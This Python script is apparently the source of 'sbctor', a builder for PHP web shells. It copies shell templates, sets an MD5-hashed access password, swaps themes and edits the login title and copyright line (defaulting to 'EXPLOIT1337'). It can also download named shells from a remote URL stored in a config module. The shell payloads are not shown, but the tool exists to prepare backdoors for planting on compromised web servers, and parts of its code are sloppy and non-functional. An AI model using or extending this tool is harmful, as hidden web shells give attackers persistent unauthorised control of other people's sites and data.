#!/usr/bin/env python

# Import
import os
import sys
import argparse
import textwrap
from dist import string as st
import shutil
import hashlib
import urllib.request as urllib2

class ArgumentParser(argparse.ArgumentParser):
    def __init__(self, *args, **kwargs):
        super(ArgumentParser, self).__init__(*args, **kwargs)
        self.program = { key: kwargs[key] for key in kwargs }
        self.options = []
    def add_argument(self, *args, **kwargs):
        super(ArgumentParser, self).add_argument(*args, **kwargs)
        option = {}
        option["flags"] = [ item for item in args ]
        for key in kwargs:
            option[key] = kwargs[key]
        self.options.append(option)
    def print_help(self):
        wrapper = textwrap.TextWrapper(width=80)

        if "description" in self.program:
            print(self.program["description"])
            print()
        logo()
        print("Options:")
        maxlen = 0
        for option in self.options:
            option["flags2"] = str.join(", ", [ "%s %s" % (item, option["metavar"]) if "metavar" in option else "%s %s" % (item, option["dest"].upper()) if "dest" in option else item for item in option["flags"] ])
            if len(option["flags2"]) > maxlen:
                maxlen = len(option["flags2"])
        for option in self.options:
            template = "  %-" + str(maxlen) + "s  "
            wrapper.initial_indent = template % option["flags2"]
            wrapper.subsequent_indent = len(wrapper.initial_indent) * " "
            if "help" in option and "default" in option:
                output = option["help"]
                output += " (default: '%s')" % option["default"] if isinstance(option["default"], str) else " (default: %s)" % str(option["default"])
                output = wrapper.fill(output)
            elif "help" in option:
                output = option["help"]
                output = wrapper.fill(output)
            elif "default" in option:
                output = "Default: '%s'" % option["default"] if isinstance(option["default"], str) else "Default: %s" % str(option["default"])
                output = wrapper.fill(output)
            else:
                output = wrapper.initial_indent
            print(output)

        # Print usage
        if "usage" in self.program:
            print("Usage: %s" % self.program["usage"])
        else:
            usage = []
            for option in self.options:
                usage += [ "[%s %s]" % (item, option["metavar"]) if "metavar" in option else "[%s %s]" % (item, option["dest"].upper()) if "dest" in option else "[%s]" % item for item in option["flags"] ]
            wrapper.initial_indent = "Usage: %s " % os.path.basename(sys.argv[0])
            wrapper.subsequent_indent = len(wrapper.initial_indent) * " "
            output = str.join(" ", usage)
            output = wrapper.fill(output)
            print(output)
        print()

def helps():
    print(st.ts,st.helps)

def logo():
    print("""
     _______..______     ______ .___________.  ______   .______      
    /       ||   _  \   /      ||           | /  __  \  |   _  \     
   |   (----`|  |_)  | |  ,----'`---|  |----`|  |  |  | |  |_)  |    
    \   \    |   _  <  |  |         |  |     |  |  |  | |      /     
 .---)   |   |  |_)  | |  `----.    |  |     |  `--'  | |  |\  \--.
 |______/    |______/   \______|    |__|      \______/  | _| `.___|
                                                                     
    """)
    helps()
    print(st.menus)
    print("ALL SHELL CAN YOU DOWNLOAD WITH THE COMMAND: \nsbctor.py -d [name of shell] (without php!)")
    print("like: sbctor.py -d id13372")

def cls():
    st.clear

def success():
    cls()
    print(st.ts,st.ds)
    print(st.ts,st.lc,path+name+ext)
    exit()

def download():
    cls
    try:
        if args.download == args.download:
            with open(path+name+ext, 'wb') as f:
                f.write(datatowrite)
                success()
    except AttributeError:
        print()

def create():
    try:
        from datetime import datetime
        time = datetime.now()
        timeformat = time.strftime("%m/%d/%Y, %H:%M:%S")
        cls()
        print(st.sc)
        print()
        print(seru.ts,"Name Of File: {}".format(args.create))
        print(seru.ts,"Created: ",timeformat)
        print(seru.ts,"File Located : usr/created/{}".format(args.create))
        print()
        print("SHELL CREATED BUT NO PASSWORD.")
        try:
            paswd = input("Enter password for your shell ~/ ")
            h = hashlib.md5(paswd.encode())
            h2 = h.hexdigest()
            password = '$auth_pass = "'+h2+'";\n'
            a_file = open("usr/created/"+args.create, "r")
            list_of_lines = a_file.readlines()
            list_of_lines[6] = password
            a_file = open("usr/created/"+args.create, "w")
            a_file.writelines(list_of_lines)
            a_file.close()
            if not paswd:
                os.remove("usr/created/"+args.create)
                cls()
                print("SHELL NOT CREATED")
                print("Reason : No Have Password!")
                sys.exit()
        except KeyboardInterrupt:
            os.remove("usr/created/"+args.create)
            print()
            print("SHELL NOT CREATED")
            print("Reason : No Have Password!")
            sys.exit()
        except UnboundLocalError:
            print("ERROR")
        except EOFError:
            print("ERROR!")
        else:
            cls()
            print("Password : "+paswd)
            print("MD5 DECRYPTED : "+h2)
        print()
        print(seru.ts,seru.pc)
        print(seru.ts,seru.hc)
    except KeyboardInterrupt:
        print(seru.ts,seru.fo)
    except AttributeError:
        logo()
    else:
        exit()

def cek():
    try:
        cek = os.path.isfile("usr/created/"+args.edit)
        if cek == False:
            print("[!] Cant Detect your Shell!! : "+args.edit+" cant be found")
            sys.exit()
        if cek == True:
            print("[~] Shell Found: "+args.edit)
    except FileNotFoundError:
        print("CANT DETECT YOUR SHELL!")
        sys.exit()
    except KeyboardInterrupt:
        print("FORCE CLOSED")
        sys.exit()

def cb():
    try:
        cek = os.path.isfile("usr/created/"+args.edit)
        if cek == False:
            print("[!] Cant Detect your Shell!! : "+args.edit+" cant be found")
            sys.exit()
        if cek == True:
            print("Please Select the color")
    except FileNotFoundError:
        print("[!] Sorry! Shell "+args.edit+" Cant be found!")
    except KeyboardInterrupt:
        print("[!] FORCE CLOSED!!")
        sys.exit()
    else:
        print("[!] Input Type : black, red, green //etc.")
        new = input("Select the color for background login ~/ ")
        if( new.isdigit()):
            print("[!] ERROR! YOUR INPUT IS A NUMBER!.")
            print("[!] FAILED CHANGING BACKGROUND COLOR!")
        else:
            title = '		background-color: '+new+';\n'
            gk = open("usr/created/"+args.edit, "r")
            line = gk.readlines()
            line[36] = title
            gk = open("usr/created/"+args.edit, "w")
            gk.writelines(line)
            gk.close()
            cls()
            print("[~] BACKGROUND LOGIN SUCCESS CHANGED")
            sys.exit()

def redtheme():
    shutil.copy('dist/default/theme/red.php', 'usr/created/'+args.edit)
    print("Success make the shell with RED THEME")
    sys.exit()

def bluetheme():
    shutil.copy('dist/default/theme/blue.php', 'usr/created/'+args.edit)
    print("Success make the shell with BLUE THEME")
    sys.exit()

def greentheme():
    shutil.copy('dist/default/theme/green.php', 'usr/created/'+args.edit)
    print("Success make the shell with GREEN THEME")
    sys.exit()

def cyantheme():
    shutil.copy('dist/default/theme/cyan.php', 'usr/created/'+args.edit)
    print("Success make the shell with CYAN THEME")
    sys.exit()

def whitetheme():
    shutil.copy('dist/default/theme/white.php', 'usr/created/'+args.edit)
    print("Success make the shell with WHITE THEME")
    sys.exit()

def darkplus():
    shutil.copy('dist/default/theme/darkplus.php', 'usr/created/'+args.edit)
    print("Success make the shell with DARK PLUS THEME")
    sys.exit()

def dark():
    shutil.copy('dist/default/theme/dark.php', 'usr/created/'+args.edit)
    print("Success make the shell with DARK THEME")
    sys.exit()

def monokai():
    shutil.copy('dist/default/theme/monokai.php', 'usr/created/'+args.edit)
    print("Success make the shell with MONOKAI THEME")
    sys.exit()

def nightblue():
    shutil.copy('dist/default/theme/nightblue.php', 'usr/created/'+args.edit)
    print("Success make the shell with NIGHT BLUE THEME")
    sys.exit()

def tc():
    print(st.menut)
    try:
        new = input("Select the Theme ~/  ")
        if new == "1":
            cls()
            redtheme()
        if new == "2":
            cls()
            bluetheme()
        if new == "3":
            cls()
            greentheme()
        if new == "4":
            cls()
            cyantheme()
        if new == "5":
            cls()
            whitetheme()
        if new == "6":
            cls()
            darkplus()
        if new == "7":
            cls()
            dark()
        if new == "8":
            cls()
            monokai()
        if new == "9":
            cls()
            nightblue()
        if new == "10":
            cls()
            sys.exit()
    except KeyboardInterrupt:
        print("FORCE CLOSED!!")
        sys.exit()
    else:
        print("ERROR HAS OCCURED!")

def tl():
    cls()
    print("Default Title (Login) : 1337 SHELL")
    print("[!] IF YOU WANT CANCEL TO CHANGING, PRESS CTRL+C")
    try:
        tittle = input("New Tittle ~/ ")

    except KeyboardInterrupt:
        print("Force Closed!")
        sys.exit()
    else:
        fault = "	<title>"+tittle+"</title>\n"
        gk = open("usr/created/"+args.edit, "r")
        line = gk.readlines()
        line[33] = fault
        gk = open("usr/created/"+args.edit, "w")
        gk.writelines(line)
        gk.close()
        print("Success Change to:",tittle)
    finally:
        sys.exit()

def td():
    cls()
    print("Default Title (Dashboard) : 1337 SHELL")
    print("[!] IF YOU WANT CANCEL CHANGING, PRESS CTRL+C")
    try:
        tittle = input("New Tittle ~/ ")

    except KeyboardInterrupt:
        print("Force Closed!")
        sys.exit()
    else:
        fault = "	<title>"+tittle+"</title>\n"
        gk = open("usr/created/"+args.edit, "r")
        line = gk.readlines()
        line[83] = fault
        gk = open("usr/created/"+args.edit, "w")
        gk.writelines(line)
        gk.close()
        print("Success Change to:",tittle)
    finally:
        sys.exit()

def c():
    cls()
    print("Default Copyright Shell : EXPLOIT1337")
    print("[!] IF YOU WANT CANCEL CHANGING, PRESS CTRL+C")
    try:
        tittle = input("New Copyright ~/ ")

    except KeyboardInterrupt:
        print("Force Closed!")
        sys.exit()
    else:
        fault = '	echo "<center>Copyright &copy; ".date("Y")." - <a href="#" target="_blank"><font color=red>'+tittle+'</font></a></center>";\n'
        gk = open("usr/created/"+args.edit, "r")
        line = gk.readlines()
        line[5336] = fault
        gk = open("usr/created/"+args.edit, "w")
        gk.writelines(line)
        gk.close()
        print("Success Change to:",tittle)
    finally:
        sys.exit()


if (__name__ == "__main__"):
    parser = ArgumentParser(description=st.title, argument_default=argparse.SUPPRESS, allow_abbrev=False, add_help=False)
    parser.add_argument("-c", "--create", action="store", dest="create", metavar="file", type=str, help=st.c)
    parser.add_argument("-d", "--download", action="store", dest="download", metavar="file", type=str, help=st.d)
    parser.add_argument("-e", "--edit", dest="edit", metavar="file", action="store", type=str, help=st.f)
    parser.add_argument("-h", "--help", action="help", help=st.h)
    args = parser.parse_args()
    seru = st
    # Function For EDITABLE
    try:
        cls()
        print('You gonna edit the '+args.edit+' Shell')
        print(seru.menu)
        edit = input("Select you want to edit ~/ ")
        if edit == "1":
            cek()
            cb()
        if edit == "2":
            cek()
            tc()
        if edit == "3":
            cek()
            tl()
        if edit == "4":
            cek()
            td()
        if edit == "5":
            cek()
            c()
    except KeyboardInterrupt:
        print('[!] Force Close Detected!')
    except AttributeError:
        logo()
    else:
        print("[!] ERROR HAS OCCURED, FAILED TO EDIT!!")

    # FUNCTION FOR DOWNLOAD
    try:
        url = st.url
        path = st.pathd
        ext = st.ext
        name = args.download
        print ('Downloading '+name+' Shell')
        response = urllib2.urlopen(url+name+ext)
        datatowrite = response.read()
        download()
        success()
    except KeyboardInterrupt:
        print('[!] Force Close Detected!')
    except AttributeError:
        cls()
        download()
    else:
        cls()
        print("[!] Cant Detect Shell : {}".format(args.download))
        print("[!] Please Try Again!")
        exit()

    # FUNCTION FOR CREATE NEW
    try:
        shutil.copy('dist/default/default.php', 'usr/created/'+args.create)
        create()
        raise
    except AttributeError:
        print()
    else:
        sys.exit()
